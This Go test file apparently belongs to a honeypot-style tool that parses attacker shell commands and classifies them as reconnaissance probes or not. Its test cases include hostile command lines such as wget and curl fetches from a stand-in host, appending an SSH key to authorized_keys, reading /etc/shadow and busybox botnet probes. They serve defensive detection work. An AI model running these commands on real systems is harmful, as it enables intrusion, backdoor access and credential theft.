package engagement

import (
	"strings"
	"testing"
)

func TestStem(t *testing.T) {
	cases := map[string]string{
		"uname -a":                          "uname",
		"  /usr/bin/Wget http://h/x":        "wget",
		"LC_ALL=C sudo /usr/bin/Wget x":     "wget",
		"sudo -u root -n /bin/sh -c id":     "sh",
		"A=1 B=2 ./run.sh":                  "run.sh",
		"sudo A=1 id":                       "id",
		"cd /tmp; wget http://h/x":          "cd",
		"cat /proc/cpuinfo | grep name":     "cat",
		`"/bin/busybox" ECCHI`:              "busybox",
		"'echo' ok":                         "echo",
		"ECHO\tOK":                          "echo",
		"\x1b[31mls":                        "?[31mls",
		"caf\xc3\xa9":                       "caf??",
		"/":                                 "/",
		"":                                  "(none)",
		"   ":                               "(none)",
		"A=1":                               "(none)",
		"> /tmp/x":                          "(none)",
		"sudo":                              "(none)",
		strings.Repeat("x", 200) + " a":     strings.Repeat("x", 64),
		strings.Repeat("y", 3*maxParse):     strings.Repeat("y", 64),
		"2>/dev/null uname":                 "uname",
		"echo hi 2>&1":                      "echo",
		"nohup ./a &":                       "nohup",
		"1abc=2 id":                         "1abc=2",
		"\\ls":                              "ls",
		"wget\nhttp://h/x":                  "wget",
		"sudo -u":                           "(none)",
		"env\x00x":                          "env?x",
		"$(curl http://h/x)":                "$(curl",
		"`id`":                              "`id`",
		"a'b c'd e":                         "ab?cd",
		"\"unterminated":                    "unterminated",
		"'unterminated":                     "unterminated",
		"x\\":                               "x",
		"A=1 /":                             "/",
		"./":                                "./",
		"dir/":                              "dir/",
		"/usr/local/bin/python3.11 -c pass": "python3.11",
	}
	for line, want := range cases {
		if got := Stem(line); got != want {
			t.Errorf("Stem(%q) = %q, want %q", line, got, want)
		}
	}
}

func TestNormalizeCommand(t *testing.T) {
	if got := NormalizeCommand("  wget \t http://h/x \n -O  y "); got != "wget http://h/x -O y" {
		t.Errorf("got %q", got)
	}
}

func TestClassifyProbe(t *testing.T) {
	cases := []struct {
		line string
		want probeKind
	}{
		// The probes named in doc/effectiveness.md.
		{"uname", probeYes},
		{"uname -a", probeYes},
		{"nproc", probeYes},
		{"cat /proc/cpuinfo", probeYes},
		{"cat /proc/version", probeYes},
		{"cat /proc/meminfo", probeYes},
		{"free -m", probeYes},
		{"lscpu", probeYes},
		{"id", probeYes},
		{"whoami", probeYes},
		{"w", probeYes},
		{"ps aux", probeYes},
		{"dmesg", probeYes},
		{"mount", probeYes},
		{"df -h", probeYes},
		{"hostname", probeYes},
		{"hostname -f", probeYes},
		{"cat /etc/issue", probeYes},
		{"cat /etc/os-release", probeYes},
		{"cat /etc/passwd", probeYes},
		{`echo -e "\x6F\x6B"`, probeYes},
		{"echo ok", probeYes},
		{"/bin/busybox ECCHI", probeYes},
		{"busybox", probeYes},
		{"/bin/busybox cat /proc/cpuinfo", probeYes},
		{"ls", probeIfNoPayload},
		{"ls -la /tmp", probeIfNoPayload},
		// Combinations.
		{"uname -a; nproc", probeYes},
		{"uname -a && id || whoami", probeYes},
		{"cat /proc/cpuinfo | grep name | wc -l", probeYes},
		{"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", probeYes},
		{"uname -a 2>/dev/null", probeYes},
		{"uname -a 2>&1", probeYes},
		{"LC_ALL=C sudo /usr/bin/uname -a", probeYes},
		{"uname; ls", probeIfNoPayload},
		{"ps | grep miner", probeYes},
		{"echo 'a;b|c'", probeYes},
		{"uname\nid", probeYes},
		// Not probes.
		{"", probeNo},
		{"wget http://h/x", probeNo},
		{"uname -a; wget http://h/x", probeNo},
		{"echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", probeNo},
		{"echo x > /tmp/y", probeNo},
		{"echo x &> /tmp/y", probeNo},
		{"uname -a > /tmp/u", probeNo},
		{"cat /etc/shadow", probeNo},
		{"cat /proc/cpuinfo /etc/shadow", probeNo},
		{"cat", probeNo},
		{"cat < /etc/passwd", probeNo},
		{"mount /dev/sda1 /mnt", probeNo},
		{"hostname pwned", probeNo},
		{"echo $(curl http://h/x)", probeNo},
		{"echo `id`", probeNo},
		{`echo "$(id)"`, probeNo},
		{"ps | xargs kill", probeNo},
		{"id | sh", probeNo},
		{"/bin/busybox wget http://h/x", probeNo},
		{"busybox ecchi", probeNo},
		{"busybox X", probeNo},
		{"busybox 12345", probeNo},
		{"uname &", probeYes},
		{"A=1", probeNo},
		{"unamex", probeNo},
		{strings.Repeat("uname;", maxParse), probeNo},
	}
	for _, tc := range cases {
		if got := classifyProbe(tc.line); got != tc.want {
			t.Errorf("classifyProbe(%q) = %d, want %d", tc.line, got, tc.want)
		}
	}
}

func TestParseLine(t *testing.T) {
	got := parseLine(`a "b c" 'd|e' f\ g | h 2>/dev/null; i > out && j <<EOF`)
	if len(got) != 3 || len(got[0]) != 2 || len(got[1]) != 1 || len(got[2]) != 1 {
		t.Fatalf("shape = %+v", got)
	}
	first := got[0][0]
	if strings.Join(first.words, ",") != "a,b c,d|e,f g" || first.writes || first.hidden {
		t.Errorf("first stage = %+v", first)
	}
	if h := got[0][1]; strings.Join(h.words, ",") != "h" || h.writes {
		t.Errorf("second stage = %+v", h)
	}
	if i := got[1][0]; strings.Join(i.words, ",") != "i" || !i.writes {
		t.Errorf("redirected stage = %+v", i)
	}
	if j := got[2][0]; strings.Join(j.words, ",") != "j" || !j.writes {
		t.Errorf("here-document stage = %+v", j)
	}
}

func FuzzCommandParsing(f *testing.F) {
	for _, s := range []string{"uname -a", `echo -e "\x6F\x6B" > /tmp/x`, "a | b || c && d; e &", "'", "\"", "\\", "2>", ">>", "$(", "sudo -u", "A=1 B=", "busybox busybox busybox X1"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, line string) {
		stem := Stem(line)
		if stem == "" || len(stem) > maxStem {
			t.Fatalf("Stem(%q) = %q", line, stem)
		}
		for i := 0; i < len(stem); i++ {
			if stem[i] < 0x21 || stem[i] > 0x7e || (stem[i] >= 'A' && stem[i] <= 'Z') {
				t.Fatalf("Stem(%q) = %q has a byte outside lower-case printable ASCII", line, stem)
			}
		}
		if k := classifyProbe(line); k > probeYes {
			t.Fatalf("classifyProbe(%q) = %d", line, k)
		}
		n := NormalizeCommand(line)
		if NormalizeCommand(n) != n {
			t.Fatalf("NormalizeCommand is not stable on %q", line)
		}
	})
}
